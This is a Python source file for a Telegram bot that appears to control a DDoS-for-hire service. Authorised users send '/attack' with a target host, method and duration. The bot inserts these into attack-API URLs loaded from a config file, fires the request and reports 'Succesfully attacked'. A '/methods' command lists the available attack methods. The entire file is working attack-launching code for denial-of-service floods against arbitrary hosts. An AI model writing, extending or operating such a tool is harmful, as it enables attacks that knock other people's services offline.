import logging
import json
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
import requests

with open('config.json', 'r') as config_file:
    config = json.load(config_file)

bot_token = config["bot_token"]
allowed_user_ids = config["allowed_user_ids"]
available_methods = config["available_methods"]
api_endpoints = config["api_endpoints"]

def attack(update, context):
    if update.message.from_user.id not in allowed_user_ids:
        update.message.reply_text("You are not authorized to use this bot.")
        return
    user_input = update.message.text[len("/attack "):]
    user_input = user_input.split()
    if len(user_input) != 3:
        missing_params = []
        if len(user_input) == 0:
            missing_params.append("HOST")
        if len(user_input) <= 1:
            missing_params.append("METHOD")
        if len(user_input) <= 2:
            missing_params.append("TIME")
        missing_params_message = "Missing parameters: " + ", ".join(missing_params)
        update.message.reply_text(missing_params_message)
        return
    host, method, time = user_input
    if method not in available_methods:
        update.message.reply_text("Unknown method. Use /methods to see available methods.")
        return
    url = api_endpoints.get(method, "")
    if not url:
        update.message.reply_text("Method not supported.")
        return
    url = url.replace("{host}", host).replace("{time}", time)
    try:
        response = requests.get(url)
        if response.status_code == 200:
            attack_details = f"Succesfully attacked 🚀\nHost: {host}\nMethod: {method}\nTime: {time}"
            update.message.reply_text(attack_details)
        else:
            update.message.reply_text("Failed to send attack request.")
    except Exception as e:
        update.message.reply_text(f"Error: {str(e)}")

def show_methods(update, context):
    methods = "Available methods: " + ", ".join(available_methods)
    update.message.reply_text(methods)

def handle_message(update, context):
    update.message.reply_text("I don't understand this command. Use /attack {HOST} {METHOD} {TIME} or /methods for available methods.")

def main():
    updater = Updater(bot_token, use_context=True)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("attack", attack))
    dp.add_handler(CommandHandler("methods", show_methods))
    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, handle_message))
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
